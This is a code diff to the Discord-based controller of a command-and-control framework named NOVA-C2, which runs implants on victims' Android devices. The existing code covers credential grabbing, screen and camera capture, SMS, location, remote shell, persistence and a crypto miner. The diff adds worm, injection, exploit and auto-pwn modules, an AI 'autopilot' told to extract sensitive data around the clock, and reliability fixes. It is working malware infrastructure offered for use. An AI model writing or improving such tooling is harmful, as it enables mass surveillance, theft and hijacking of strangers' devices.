@@ -7,6 +7,7 @@ import {
 } from 'discord.js'
 import { ICONS } from './icons.js'
 import { C, E, A, smallCaps, mono, createBox, bold, ts, randGif, DEV_CMDS, BOT_CMDS, VALID_CMDS, ALERT_CMD_MAP, BTN_ACTIONS, formatSize, barAnim, clockText } from './utils/index.js'
+import { novaLogoEmbed, bannerCard, consoleLine } from './banner.js'
 import { videoStream } from './stream.js'
 import { aiCoPilot } from './ai-copilot/index.js'
 import { aiContext } from './ai-copilot/context.js'
@@ -28,8 +29,9 @@ if (!DISCORD_TOKEN) { console.error('Missing DISCORD_TOKEN'); process.exit(1) }
 
 // ── State Maps (persisted) ────────────────────────────────────────────────
 const state = createStateStore({})
-const targets = state.targets instanceof Map ? state.targets : new Map()
-const deviceStatus = state.deviceStatus instanceof Map ? state.deviceStatus : new Map()
+const persisted = reviveMaps(state, ['targets', 'deviceStatus'])
+const targets = persisted.targets instanceof Map ? persisted.targets : new Map()
+const deviceStatus = persisted.deviceStatus instanceof Map ? persisted.deviceStatus : new Map()
 state.targets = targets
 state.deviceStatus = deviceStatus
 const devicePages = new Map()
@@ -93,20 +95,28 @@ const B = {
   location:   btn('location',   'LOCATION',   '📍',       'primary'),
   camera:     btn('camera',     'CAMERA',     '📷',       'danger'),
   dir:        btn('dir',        'DIR',        '📁',       'primary'),
+  worm:       btn('worm',       'WORM',       '🪱',       'danger'),
+  brain:      btn('brain',      'BRAIN',      '🧠',       'danger'),
+  inject:     btn('inject',     'INJECT',     '💉',       'danger'),
+  config:     btn('config',     'CONFIG',     '⚙️',       'primary'),
+  ai:         btn('ai',         'AI COPILOT', '🤖',       'danger'),
+  campaign:   btn('campaign',   'CAMPAIGN',   '🎯',       'danger'),
 }
 
 // ── Menu Layouts ─────────────────────────────────────────────────────────
 const MENU_BTNS = [
-  ...actionRow(B.victims, B.screenshot, B.stream, B.shell),
-  ...actionRow(B.files, B.grabber, B.broadcast),
-  ...actionRow(B.target, B.menu, B.help, B.info),
+  ...actionRow(B.victims, B.screenshot, B.stream, B.shell, B.grabber),
+  ...actionRow(B.worm, B.brain, B.inject, B.config, B.ai),
+  ...actionRow(B.files, B.contacts, B.sms, B.location, B.camera),
+  ...actionRow(B.target, B.broadcast, B.menu, B.help, B.info),
 ].flat()
 
 const HELP_BTNS = actionRow(B.menu).flat()
 
 const RESULT_BTNS = [
-  ...actionRow(B.screenshot, B.stream, B.shell),
-  ...actionRow(B.files, B.grabber, B.contacts, B.sms),
+  ...actionRow(B.screenshot, B.stream, B.shell, B.grabber),
+  ...actionRow(B.worm, B.brain, B.inject),
+  ...actionRow(B.files, B.contacts, B.sms),
   ...actionRow(B.victims, B.target, B.menu, B.help),
 ].flat()
 
@@ -127,12 +137,14 @@ const ALERT_BTNS_ONLINE = (chId) => [
     btn('a_victims_' + chId, 'VICTIMS', '👻', 'primary'),
     btn('a_ss_' + chId, 'SCREENSHOT', '📸', 'danger'),
     btn('a_grabber_' + chId, 'GRABBER', '🔍', 'danger'),
+    btn('a_inject_' + chId, 'INJECT', '💉', 'danger'),
   ),
   new ActionRowBuilder().addComponents(
     btn('a_stream_' + chId, 'LIVE', '📡', 'danger'),
     btn('a_cmd_' + chId, 'SHELL', '💻', 'primary'),
     btn('a_persist_' + chId, 'PERSIST', '💉', 'primary'),
     btn('a_files_' + chId, 'FILES', '📁', 'primary'),
+    btn('a_worm_' + chId, 'WORM', '🪱', 'danger'),
   ),
 ]
 
@@ -166,7 +178,7 @@ function logCommand(userId, userName, cmd, payload, channelName) {
   if (!commandLog.has(userId)) commandLog.set(userId, [])
   const log = commandLog.get(userId)
   log.push(entry)
-  if (log.length > COMMAND_LOG_MAX) log.shift()
+  if (log.length > COMMAND_LOG_MAX) log.splice(0, log.length - COMMAND_LOG_MAX)
 }
 
 function formatCommandLog(userId) {
@@ -184,20 +196,22 @@ async function sendCmd(channel, cmd, payload = '', retries = 3) {
   const content = payload ? `!${cmd} ${payload}` : `!${cmd}`
   const dedupKey = `${channel.id}:${content}`
   const now = Date.now()
-  for (const [key, ts] of sentCommands) { if (now - ts > COMMAND_DEDUP_WINDOW) sentCommands.delete(key) }
+  for (const key of [...sentCommands.keys()]) { if (now - sentCommands.get(key) > COMMAND_DEDUP_WINDOW) sentCommands.delete(key) }
   if (sentCommands.has(dedupKey)) return { ok: true, name: channel.name, dedup: true }
   sentCommands.set(dedupKey, now)
 
   for (let attempt = 0; attempt <= retries; attempt++) {
     try {
-      const timeout = new Promise((_, rej) => setTimeout(() => rej(new Error('SEND_TIMEOUT')), 15000))
-      await Promise.race([channel.send(content), timeout])
+      let timeoutId
+      const timeout = new Promise((_, rej) => { timeoutId = setTimeout(() => rej(new Error('SEND_TIMEOUT')), 15000) })
+      await Promise.race([channel.send(content).finally(() => clearTimeout(timeoutId)), timeout])
       return { ok: true, name: channel.name }
     } catch (e) {
       if (e.message?.includes('Unknown Message')) return { ok: false, err: 'channel_gone' }
       const retryable = e.code === 429 || e.status === 429 || e.status >= 500 || e.code === 'ECONNRESET' || e.code === 'ETIMEDOUT' || e.message === 'SEND_TIMEOUT'
       if (retryable && attempt < retries) {
-        const wait = Math.min(e.retryAfter || e.retryAfterMs || 1000 * Math.pow(2, attempt), 30000)
+        const retryAfterMs = e.retryAfter ? e.retryAfter * 1000 : (e.rateLimit?.retryAfter || 0)
+        const wait = Math.min(retryAfterMs > 0 ? retryAfterMs : 1000 * Math.pow(2, attempt), 30000)
         await new Promise(r => setTimeout(r, wait))
         continue
       }
@@ -221,12 +235,11 @@ async function sendToTarget(uid, guild, cmd, payload) {
 
 // ── Embed Builders ──────────────────────────────────────────────────────
 function menuEmbed() {
-  const total = [...deviceStatus.values()].filter(s => s.online === true).length
+  const onlineCount = [...deviceStatus.values()].filter(s => s.online === true).length
   const totalDevices = deviceStatus.size
-  return bloodEmbed(bold(`${E.sharingan} NOVA-C2 ${E.sharingan}`), 'info',
-    `**${E.flame} C2 Framework v3.1**\n${clockText()}\n\n` +
-    `**${E.ghost} ${totalDevices} device(s)** — ${total} online | ${totalDevices - total} offline\n\n` +
-    `**${E.eye} Commands**\n` +
+  return novaLogoEmbed('online',
+    `**${E.ghost} ${totalDevices} device(s)** — ${onlineCount} online | ${totalDevices - onlineCount} offline\n\n` +
+    `${E.eye} **Commands**\n` +
     `• \`!devices\` — List all victims\n` +
     `• \`!target <name>\` — Select victim\n` +
     `• \`!untarget\` — Clear target\n` +
@@ -238,10 +251,9 @@ function menuEmbed() {
     `• \`!ai <request>\` — AI Co-Pilot\n` +
     `• \`!campaign <obj>\` — Autopilot\n` +
     `• \`!analyze\` — Intel analysis\n\n` +
-    `**${E.star} Slash Commands**\n` +
+    `${E.star} **Slash Commands**\n` +
     `\`/menu\` \`/help\` \`/devices\` \`/target\` \`/broadcast\` \`/send\` \`/grabber\` \`/miner\` \`/upload\` \`/files\`\n\n` +
-    `**${total > 0 ? `${E.knife} ${total} device(s) online — target one to begin` : `${E.coffin} Waiting for devices...`}**`,
-    { footer: `${E.skull} NOVA-C2 ⚡ ${ts()}`, thumb: randGif() })
+    `${onlineCount > 0 ? `${E.knife} ${onlineCount} device(s) online — target one to begin` : `${E.coffin} Waiting for devices...`}`)
 }
 
 function helpEmbed() {
@@ -265,6 +277,11 @@ function helpEmbed() {
     `${A.cyan}┃${A.reset} ${A.yellow}       ${A.reset}      : !recent !ext !download !rm !mv !cp !mkdir\n` +
     `${A.cyan}┃${A.reset}\n` +
     `${A.cyan}┃${A.reset} ${A.yellow}ADVANCED${A.reset}   : !wifipass !netstat !shell !persist\n` +
+    `${A.cyan}┃${A.reset}\n` +
+    `${A.cyan}┃${A.reset} ${A.red}EXPLOIT${A.reset}    : !worm !brain !inject !exploit !auto_pwn\n` +
+    `${A.cyan}┃${A.reset} ${A.red}       ${A.reset}      : !worm status/start/stop/infect\n` +
+    `${A.cyan}┃${A.reset} ${A.red}       ${A.reset}      : !brain status/fix/fixlog/inject/heal\n` +
+    `${A.cyan}┃${A.reset} ${A.red}       ${A.reset}      : !inject scan/targets/run/auto\n` +
     `${A.cyan}┃${A.reset}\n` +
     `${A.cyan}┃${A.reset} ${A.red}CONTROL${A.reset}    : !admin !overlay !click !input !open !screen\n` +
     `${A.cyan}┃${A.reset} ${A.red}       ${A.reset}      : !gesture !pin\n` +
@@ -295,6 +312,7 @@ function helpEmbed() {
         { name: `${E.sword} CONTROL`, value: '`!admin` `!overlay` `!click` `!input` `!open` `!screen` `!pin`', inline: true },
         { name: `${E.crown} MINING`, value: '`!miner [start|stop|status|set_wallet|set_pool]`', inline: true },
         { name: `${E.star} SYSTEM`, value: '`!update` `!config` `!upload`', inline: true },
+        { name: `${E.sword} EXPLOIT`, value: '`!worm` `!brain` `!inject` `!exploit` `!auto_pwn`', inline: true },
         { name: `${E.brain} BOT CMDS`, value: '`!ai` `!campaign` `!analyze` `!history` `!search`', inline: true },
       )
       .setFooter({ text: `${E.skull} NOVA-C2 v3.1 ${E.skull} ${ts()}`, iconURL: ICONS.footer || undefined })
@@ -409,7 +427,9 @@ async function handleMultiDeviceSlash(i, channels, cmd, payload, uid, username) 
   if (!pages.length) return i.editReply(`${E.coffin} No devices ${E.skull}`)
   const m = await i.editReply({ content: `Select victim for \`!${cmd}\` ${E.knife}`, components: pages[0].components })
   if (pages.length > 1) devicePages.set(m.id, { pages, idx: 0, ts: Date.now() })
-  const col = (await i.channel || i.channel).createMessageComponentCollector({
+  const chForCol = i.channel || await i.fetchReply().then(r => r.channel).catch(() => null)
+  if (!chForCol) return
+  const col = chForCol.createMessageComponentCollector({
     filter: si => si.user.id === uid && si.customId === 'sel' && si.message.id === m.id,
     time: SELECT_TIMEOUT, max: 1,
   })
@@ -439,19 +459,21 @@ client.on(Events.InteractionCreate, async (i) => {
     const uid = user.id
     if (!guild) return i.editReply(`${E.coffin} Server only ${E.skull}`).catch(() => {})
     if (isOnCooldown(uid)) return i.editReply(`${E.skull} Cooldown`).catch(() => {})
+    const ec = (v) => v?.catch ? v.catch(() => {}) : v
 
     try {
       switch (commandName) {
-        case 'menu': return i.editReply({ ...menuEmbed(), components: MENU_BTNS })
-        case 'help': return i.editReply({ ...helpEmbed(), components: HELP_BTNS })
+        case 'menu': return i.editReply({ ...menuEmbed(), components: MENU_BTNS }).catch(() => {})
+        case 'help': return i.editReply({ ...helpEmbed(), components: HELP_BTNS }).catch(() => {})
         case 'devices': {
           await guild.channels.fetch(); await refreshDeviceStatus(guild, false)
           const pages = buildDevicePages(guild)
           if (!pages.length) return i.editReply({ embeds: bloodEmbed('NO VICTIMS', 'offline', `${E.coffin} No devices ${E.skull}`).embeds })
           const reply = await i.editReply({ embeds: pages[0].embeds, components: pages[0].components })
           if (pages.length > 1) {
-            devicePages.set(reply.id, { pages, idx: 0, ts: Date.now() })
-            setTimeout(async () => { devicePages.delete(reply.id); try { await reply.edit({ components: [...paginationRow(true), ...MENU_BTNS] }) } catch {} }, PAGINATION_TIMEOUT)
+            const pd = { pages, idx: 0, ts: Date.now(), expired: false }
+            devicePages.set(reply.id, pd)
+            setTimeout(async () => { if (pd.expired) return; pd.expired = true; devicePages.delete(reply.id); try { await reply.edit({ components: [...paginationRow(true), ...MENU_BTNS] }) } catch {} }, PAGINATION_TIMEOUT)
           }
           return
         }
@@ -481,7 +503,7 @@ client.on(Events.InteractionCreate, async (i) => {
           const p = bc.replace(/^!+/, '').split(/\s+/)
           const bcCmd = p[0], bcPayload = p.slice(1).join(' ')
           if (!VALID_CMDS.has(bcCmd)) return i.editReply(`${E.warning} Invalid: \`!${bcCmd}\` ${E.skull}`)
-          if (DESTRUCTIVE_CMDS.includes(bcCmd) && !bcPayload.includes('--force')) {
+          if (DESTRUCTIVE_CMDS.includes(bcCmd) && !bcPayload.startsWith('--force')) {
             return i.editReply(`${E.bomb} **Confirm?** \`!${bcCmd}\` to ALL. Use \`!broadcast ${bcCmd} --force\` in text chat.`)
           }
           await guild.channels.fetch()
@@ -650,19 +672,17 @@ client.on(Events.InteractionCreate, async (i) => {
     if (i.customId.startsWith('a_')) {
       const parts = i.customId.split('_')
       const cmdKey = parts[1]; const chId = parts.slice(2).join('_')
-      if (cmdKey === 'menu') return i.editReply({ ...menuEmbed(), components: MENU_BTNS, ephemeral: true }).catch(() => {})
+      if (cmdKey === 'menu') return i.followUp({ ...menuEmbed(), components: MENU_BTNS, ephemeral: true }).catch(() => {})
       if (cmdKey === 'victims') {
         await guild.channels.fetch().catch(() => {}); await refreshDeviceStatus(guild, false)
         const pages = buildDevicePages(guild)
-        return pages.length ? i.editReply({ embeds: pages[0].embeds, components: pages[0].components, ephemeral: true }).catch(() => {}) : i.editReply({ content: `${E.coffin} No implants`, ephemeral: true }).catch(() => {})
+        return i.followUp(pages.length ? { embeds: pages[0].embeds, components: pages[0].components, ephemeral: true } : { content: `${E.coffin} No implants`, ephemeral: true }).catch(() => {})
       }
       const ch = guild.channels.cache.get(chId)
-      if (!ch) return i.editReply({ content: `${E.coffin} Channel gone`, ephemeral: true }).catch(() => {})
+      if (!ch) return i.followUp({ content: `${E.coffin} Channel gone`, ephemeral: true }).catch(() => {})
       const actualCmd = ALERT_CMD_MAP[cmdKey] || cmdKey
-      const result = await sendCmd(ch, actualCmd, actualCmd === 'grabber' ? 'all' : '')
-      return result.ok
-        ? i.editReply({ content: `${E.knife} \`!${actualCmd}\` sent ${E.skull}`, components: RESULT_BTNS, ephemeral: true }).catch(() => {})
-        : i.editReply({ content: `${E.coffin} ${result.err} ${E.skull}`, ephemeral: true }).catch(() => {})
+      const result = await sendCmdLogged(ch, actualCmd, actualCmd === 'grabber' ? 'all' : '', uid, i.user.username)
+      return i.followUp(result.ok ? { content: `${E.knife} \`!${actualCmd}\` sent ${E.skull}`, components: RESULT_BTNS, ephemeral: true } : { content: `${E.coffin} ${result.err} ${E.skull}`, ephemeral: true }).catch(() => {})
     }
 
     // Navigation buttons
@@ -672,15 +692,33 @@ client.on(Events.InteractionCreate, async (i) => {
       if (!pages.length) return i.followUp({ content: `${E.coffin} No implants`, ephemeral: true }).catch(() => {})
       const reply = await i.followUp({ embeds: pages[0].embeds, components: pages[0].components, fetchReply: true }).catch(() => {})
       if (!reply) return
-      if (pages.length > 1) {
-        devicePages.set(reply.id, { pages, idx: 0, ts: Date.now() })
-        setTimeout(async () => { devicePages.delete(reply.id); try { await reply.edit({ components: [...paginationRow(true), ...MENU_BTNS] }) } catch {} }, PAGINATION_TIMEOUT)
-      }
+          if (pages.length > 1) {
+            const pageData = { pages, idx: 0, ts: Date.now(), expired: false }
+            devicePages.set(reply.id, pageData)
+            setTimeout(async () => { if (pageData.expired) return; pageData.expired = true; devicePages.delete(reply.id); try { await reply.edit({ components: [...paginationRow(true), ...MENU_BTNS] }) } catch {} }, PAGINATION_TIMEOUT)
+          }
       return
     }
     if (i.customId === 'menu') return i.followUp({ ...menuEmbed(), components: MENU_BTNS, ephemeral: true }).catch(() => {})
     if (i.customId === 'help') return i.followUp({ ...helpEmbed(), components: HELP_BTNS, ephemeral: true }).catch(() => {})
-    if (i.customId === 'info') return i.followUp({ content: `${E.bone} **NOVA-C2 v3.1**\n${E.zap} WebSocket Gateway\n${E.heart} Heartbeat: 4-7 min\n${E.target} Commands: ${DEV_CMDS.size}\n${E.ghost} Max victims: unlimited`, ephemeral: true }).catch(() => {})
+    if (i.customId === 'info') return i.followUp({
+      embeds: [new EmbedBuilder().setColor(C.venom).setTitle(`${E.sharingan} NOVA-C2 SYSTEM`)
+        .setDescription(`\`\`\`yaml\nC2 Engine:   NOVA-C2 v3.1\nGateway:     Discord WebSocket\nHeartbeat:   4-7 min interval\nCommands:    ${DEV_CMDS.size} total\nMax Victims: Unlimited\nSlot Limit:  None\nAutopilot:   AiAutopilot + AiSelfHeal\nWorm:        Multi-Vector (BT/SMS/WiFi)\nInject:      11 techniques\nBrain:       Self-heal + Auto-pwn\nPersist:     Boot + Alarm + Shell + Daemon\nMining:      XMRig (ARM64/ARM/x86)\nCrypto:      AES-256 + RSA-2048\nState:       Persistent (disk)\n\`\`\``)
+        .setFooter({ text: `${E.skull} NOVA-C2 ⚡ ${ts()}`, iconURL: ICONS.footer || undefined })
+      ], ephemeral: true }).catch(() => {})
+
+    // Module buttons (worm/brain/inject/config) — send status to target
+    for (const [btnId, cmd] of Object.entries({ worm: 'worm', brain: 'brain', inject: 'inject', config: 'config' })) {
+      if (i.customId === btnId) {
+        const r = await sendToTarget(uid, guild, cmd, 'status')
+        if (r.ok) logCommand(uid, i.user.username, cmd, 'status', r.name || 'unknown')
+        return i.followUp({ content: r.ok ? `${E.knife} \`!${cmd} status\` sent ${E.skull}` : `${E.coffin} ${r.err} ${E.skull}`, ephemeral: true }).catch(() => {})
+      }
+    }
+    // AI CoPilot: !ai
+    if (i.customId === 'ai') return i.followUp({ content: `Use \`!ai <request>\` or type your request ${E.robot}`, ephemeral: true }).catch(() => {})
+    // Campaign: !campaign
+    if (i.customId === 'campaign') return i.followUp({ content: `Use \`!campaign <objective>\` to start autopilot ${E.target}`, ephemeral: true }).catch(() => {})
 
     // Target button
     if (i.customId === 'target') {
@@ -692,7 +730,7 @@ client.on(Events.InteractionCreate, async (i) => {
       if (!pages.length) return i.followUp({ content: `${E.warning} Use \`!target <name>\``, ephemeral: true }).catch(() => {})
       try {
         const reply = await i.followUp({ content: `Select victim ${E.knife}`, components: pages[0].components, ephemeral: true, fetchReply: true })
-        if (pages.length > 1) { devicePages.set(reply.id, { pages, idx: 0, ts: Date.now() }); setTimeout(() => devicePages.delete(reply.id), SELECT_TIMEOUT) }
+        if (pages.length > 1) { const pd = { pages, idx: 0, ts: Date.now(), expired: false }; devicePages.set(reply.id, pd); setTimeout(() => { if (pd.expired) return; pd.expired = true; devicePages.delete(reply.id) }, SELECT_TIMEOUT) }
       } catch { await i.followUp({ content: `${E.coffin} Selector failed`, ephemeral: true }).catch(() => {}) }
       return
     }
@@ -905,10 +943,16 @@ client.on(Events.InteractionCreate, async (i) => {
       if (action === 'reject') { campaignManager.cancelCampaign(guild.id, targetUid, campaignId); return i.update({ content: `${E.coffin} Cancelled`, components: [] }).catch(() => {}) }
       if (action === 'plan') return i.update({ content: `${E.tools} Manual planning not available`, components: [] }).catch(() => {})
       await i.update({ content: `${E.heart} Campaign executing...`, components: [] }).catch(() => {})
+      const campaignStart = Date.now()
+      const CAMPAIGN_TIMEOUT = 10 * 60 * 1000
       try {
         const texts = []
         while (campaign.status !== 'completed' && campaign.status !== 'failed' && campaign.status !== 'aborted') {
-          const result = await campaignManager.executePhase(campaign, guild, client)
+          if (Date.now() - campaignStart > CAMPAIGN_TIMEOUT) { campaignManager.cancelCampaign(guild.id, targetUid, campaignId); break }
+          const result = await Promise.race([
+            campaignManager.executePhase(campaign, guild, client),
+            new Promise((_, rej) => setTimeout(() => rej(new Error('phase_timeout')), 60000))
+          ])
           texts.push(`[${result.phase || '?'}] ${result.status}`)
           if (campaign.currentPhaseIndex % 2 === 0 || result.status === 'completed' || result.status === 'failed') {
             const p = `${'█'.repeat(campaign.currentPhaseIndex)}${'░'.repeat(Math.max(0, campaign.phases.length - campaign.currentPhaseIndex))}`
@@ -932,6 +976,8 @@ client.on(Events.InteractionCreate, async (i) => {
 // ── HEARTBEAT WATCHER + RESPONSE FORMATTER + AUTO-DECRYPT ────────────────
 client.on(Events.MessageCreate, async (msg) => {
   if (msg.author.bot && msg.channel.name?.startsWith('device-')) {
+    // Skip the bot's own replies to prevent re-decrypt loops
+    if (msg.author.id === client.user.id) return
     const c = msg.content || ''
     if (c.includes(':heartbeat:') || c.includes('**Alive**') || c.includes('**Device Online**') || c.includes('**Reconnected**') || c.includes(':green_circle:')) {
       deviceStatus.set(msg.channel.id, { online: true, lastSeen: msg.createdTimestamp, name: msg.channel.name })
@@ -998,8 +1044,8 @@ client.on(Events.MessageCreate, async (msg) => {
       }
     }
 
-    // Skip encrypt banner + base64 lines from decryption embed editing
-    if (c.startsWith('🔒') || msg.author.id === client.user.id) return
+    // Skip encrypt banner lines from format editing
+    if (c.startsWith('🔒')) return
 
     try {
       const deviceName = msg.channel.name.replace('device-', '')
@@ -1021,7 +1067,8 @@ client.on(Events.MessageCreate, async (msg) => {
   const cmdL = cmd.toLowerCase()
   const uid = msg.author.id, guild = msg.guild
   if (!guild) return
-  if (isRateLimited(uid) || isOnCooldown(uid)) return
+  if (isRateLimited(uid)) return msg.reply(`${E.skull} Rate limited — slow down ${E.skull}`).catch(() => {})
+  if (isOnCooldown(uid)) return msg.reply(`${E.coffin} Cooldown — wait a moment ${E.skull}`).catch(() => {})
 
   try {
     if (BOT_CMDS.includes(cmdL)) {
@@ -1034,8 +1081,9 @@ client.on(Events.MessageCreate, async (msg) => {
           if (!pages.length) return msg.reply({ embeds: bloodEmbed('NO VICTIMS', 'offline', `${E.coffin} No devices ${E.skull}`).embeds })
           const reply = await msg.reply({ embeds: pages[0].embeds, components: pages[0].components })
           if (pages.length > 1) {
-            devicePages.set(reply.id, { pages, idx: 0, ts: Date.now() })
-            setTimeout(async () => { devicePages.delete(reply.id); try { await reply.edit({ components: [...paginationRow(true), ...MENU_BTNS] }) } catch {} }, PAGINATION_TIMEOUT)
+            const pd = { pages, idx: 0, ts: Date.now(), expired: false }
+            devicePages.set(reply.id, pd)
+            setTimeout(async () => { if (pd.expired) return; pd.expired = true; devicePages.delete(reply.id); try { await reply.edit({ components: [...paginationRow(true), ...MENU_BTNS] }) } catch {} }, PAGINATION_TIMEOUT)
           }
           return
         }
@@ -1142,6 +1190,17 @@ client.on(Events.MessageCreate, async (msg) => {
           }
         }
         case '!ai': {
+          // ── Device-bound !ai subcommands ─────────────────────────────
+          const deviceAiSubs = new Set(['on','off','scan','poc','inject','execute','harvest','history','clear','config'])
+          const firstArg = args[0]?.toLowerCase()
+          if (firstArg && deviceAiSubs.has(firstArg)) {
+            await guild.channels.fetch()
+            const t = await requireTarget(guild, targets, uid)
+            if (!t.channel) return msg.reply(`${E.coffin} ${t.err} ${E.skull}`)
+            const r = await sendCmdLogged(t.channel, 'ai', args.join(' '), uid, msg.author.username)
+            return r.ok ? msg.reply({ content: `${E.knife} \`!ai ${args.join(' ')}\` sent ${E.skull}`, components: RESULT_BTNS }) : msg.reply(`${E.coffin} ${r.err} ${E.skull}`)
+          }
+
           console.log(`[AI] !ai command received from ${msg.author.tag} in #${msg.channel.name}`)
           console.log(`[AI] isAvailable: ${aiCoPilot.isAvailable}, provider: ${aiCoPilot.providerName}`)
           if (!aiCoPilot.isAvailable) {
@@ -1150,7 +1209,6 @@ client.on(Events.MessageCreate, async (msg) => {
           }
 
           // AI Controller sub-commands
-          const firstArg = args[0]?.toLowerCase()
           if (firstArg === 'give_control' || firstArg === 'autonomous') {
             const objective = args.slice(1).join(' ') || 'Full autonomous intelligence gathering — profile all devices, extract sensitive data, monitor activity, and report findings 24/7'
             try {
@@ -1365,42 +1423,41 @@ async function refreshDeviceStatus(guild, sendAlerts = false) {
       if (deviceCheckLocks.has(ch.id)) return
       deviceCheckLocks.add(ch.id)
       try {
-        let online = false, lastSeen = null
+        let online = null, lastSeen = null, mModel = ch.name.replace('device-', ''), mAndroid = '?', mIp = '?'
         try {
-          const msgs = await ch.messages.fetch({ limit: 25 })
+          const msgs = await ch.messages.fetch({ limit: 50 })
           for (const [, m] of msgs) {
-            if (!m.content) continue
-            if ((m.content.includes(':heartbeat:') || m.content.includes(':green_circle:') || m.content.includes('🟢') || /<:heartbeat:\d+>/.test(m.content) || /<:green_circle:\d+>/.test(m.content) || /<a?:green_circle:\d+>/.test(m.content) || m.content.includes('**Alive**') || m.content.includes('**Device Online**') || m.content.includes('**Reconnected**')) && Date.now() - m.createdTimestamp < HEARTBEAT_TIMEOUT) {
-              online = true; lastSeen = m.createdTimestamp; break
+            if (!m.content || m.author.id === client.user.id) continue
+            const isHb = m.content.includes(':heartbeat:') || m.content.includes(':green_circle:') || m.content.includes('🟢') || /<:heartbeat:\d+>|<:green_circle:\d+>|<a?:green_circle:\d+>/.test(m.content) || m.content.includes('**Alive**') || m.content.includes('**Device Online**') || m.content.includes('**Reconnected**') || m.content.includes('**Device Reconnected**')
+            if (isHb && Date.now() - m.createdTimestamp < HEARTBEAT_TIMEOUT) {
+              online = true; lastSeen = m.createdTimestamp
+              const om = m.content.match(/\*\*Device Online\*\*.*?—\s*(.+?)\s*\((.+?)\)\s*\|?\s*IP:\s*(.+)/)
+              if (om) { mModel = om[1].trim(); mAndroid = om[2].trim(); mIp = om[3].trim() }
+              const rm = m.content.match(/\*\*Reconnected\*\*.*?—\s*(.+?)\s*\|?\s*IP:\s*(.+)/)
+              if (rm) { mModel = rm[1].trim(); mIp = rm[2].trim() }
+              const hm = m.content.match(/\*\*Alive\*\*.*?—\s*(.+?)\s*\|?\s*IP:\s*(.+)/)
+              if (hm) { mModel = hm[1].trim(); mIp = hm[2].trim() }
+              break
             }
-          }
-          if (!online && msgs.size > 0) {
-            lastSeen = msgs.first().createdTimestamp
-            if (Date.now() - lastSeen < HEARTBEAT_TIMEOUT) online = true
           }
         } catch {}
         const prev = deviceStatus.get(ch.id)
         const wasOnline = prev?.online ?? false
-        deviceStatus.set(ch.id, { online, lastSeen, name: ch.name })
+        // If fetch succeeded but no heartbeat found, check if previous status is still fresh
+        if (online === null) {
+          online = wasOnline && prev?.lastSeen && Date.now() - prev.lastSeen < HEARTBEAT_TIMEOUT
+          lastSeen = prev?.lastSeen ?? null
+          mModel = prev?.model ?? mModel
+          mAndroid = prev?.android ?? mAndroid
+          mIp = prev?.ip ?? mIp
+        }
+        deviceStatus.set(ch.id, { online, lastSeen, name: ch.name, model: mModel, android: mAndroid, ip: mIp })
         if (!alertCh || wasOnline === online) return
         const cooldownKey = `${ch.id}:${online}`
-        if (Date.now() - (alertCooldown.get(cooldownKey) || 0) < 120000) return
+        if (Date.now() - (alertCooldown.get(cooldownKey) || 0) < 180000) return
         if (Date.now() - botStartTime < 30000) return
         alertCooldown.set(cooldownKey, Date.now())
 
-        let mModel = ch.name.replace('device-', ''), mAndroid = '?', mIp = '?'
-        try {
-          const msgs = await ch.messages.fetch({ limit: 25 })
-          for (const [, m] of msgs) {
-            if (!m.content) continue
-            const om = m.content.match(/\*\*Device Online\*\*.*?—\s*(.+?)\s*\((.+?)\)\s*\|?\s*IP:\s*(.+)/)
-            if (om) { mModel = om[1].trim(); mAndroid = om[2].trim(); mIp = om[3].trim(); break }
-            const rm = m.content.match(/\*\*Reconnected\*\*.*?—\s*(.+?)\s*\|?\s*IP:\s*(.+)/)
-            if (rm) { mModel = rm[1].trim(); mIp = rm[2].trim(); break }
-            const hm = m.content.match(/\*\*Alive\*\*.*?—\s*(.+?)\s*\|?\s*IP:\s*(.+)/)
-            if (hm) { mModel = hm[1].trim(); mIp = hm[2].trim(); break }
-          }
-        } catch {}
         const deviceName = ch.name.replace('device-', '')
 
         try {
@@ -1450,7 +1507,7 @@ function cleanupMaps() {
     const ts = typeof data === 'object' ? data.ts : now
     if (!chId || now - ts > 3600000 || (client.channels.cache.size > 0 && !client.channels.cache.has(chId))) targets.delete(uid)
   }
-  for (const [chId, st] of deviceStatus) { if (!client.channels.cache.has(chId) && st.lastSeen && now - st.lastSeen > 3600000) deviceStatus.delete(chId) }
+  for (const [chId, st] of deviceStatus) { if (!client.channels.cache.has(chId) && (!st.lastSeen || now - st.lastSeen > 3600000)) deviceStatus.delete(chId) }
   for (const [id, page] of devicePages) { if (now - page.ts > PAGINATION_TIMEOUT) devicePages.delete(id) }
   for (const [uid, data] of rateLimits) { if (now - data.ts > RATE_LIMIT_WINDOW) rateLimits.delete(uid) }
   for (const [uid, cd] of commandCooldowns) { if (now - cd > COMMAND_COOLDOWN * 2) commandCooldowns.delete(uid) }
@@ -1473,26 +1530,28 @@ client.once(Events.ClientReady, async () => {
     console.log(`[MEM] RSS: ${(mem.rss / 1024 / 1024).toFixed(1)}MB | Heap: ${(mem.heapUsed / 1024 / 1024).toFixed(1)}MB | Targets: ${targets.size} | Devices: ${deviceStatus.size}`)
   }, 1800000)
 
-  try { await client.user.setUsername('NOVA-C2').catch(() => {}); client.user.setActivity('👁️ NOVA-C2 watching 0 devices | !help', { type: 3 }) } catch {}
+  client.user.setActivity('👁️ NOVA-C2 watching 0 devices | !help', { type: 3 }).catch(() => {})
 
   if (ALLOWED_CHANNEL_ID && !startupMsgSent) {
     startupMsgSent = true
-    const ch = await client.channels.fetch(ALLOWED_CHANNEL_ID).catch(() => null)
+      const ch = await client.channels.fetch(ALLOWED_CHANNEL_ID).catch(() => null)
     if (!ch) { console.error(`[!] ALLOWED_CHANNEL_ID ${ALLOWED_CHANNEL_ID} not found`) }
     else {
-      await ch.send({
-        embeds: [new EmbedBuilder().setColor(C.sharingan).setTitle(`${E.sharingan} ${bold('NOVA-C2')}`)
-          .setDescription(`**${E.sharingan} C2 Framework v3.1**\nGateway: Discord WebSocket\nStatus: ${E.flame} ACTIVE\nOnline: ${ts()}\n\nAwaiting commands...`)
-          .setThumbnail(randGif()).setFooter({ text: `${E.skull} NOVA-C2 ⚡ ${ts()}`, iconURL: ICONS.footer || undefined })],
-        components: MENU_BTNS,
-      }).catch(err => console.error('Startup:', err.message))
+      const onlineCount = [...deviceStatus.values()].filter(s => s.online === true).length
+      const totalDevices = deviceStatus.size
+      await ch.send({ ...novaLogoEmbed('online',
+        `**${E.ghost} ${totalDevices} device(s)** — ${onlineCount} online | ${totalDevices - onlineCount} offline\n\n` +
+        `${E.zap} **Gateway**: Discord WebSocket\n` +
+        `${E.flame} **Status**: ACTIVE\n` +
+        `${E.clock} **Online**: ${ts()}\n\n` +
+        `${E.knife} Awaiting commands...`), components: MENU_BTNS }) .catch(err => console.error('Startup:', err.message))
     }
   }
 
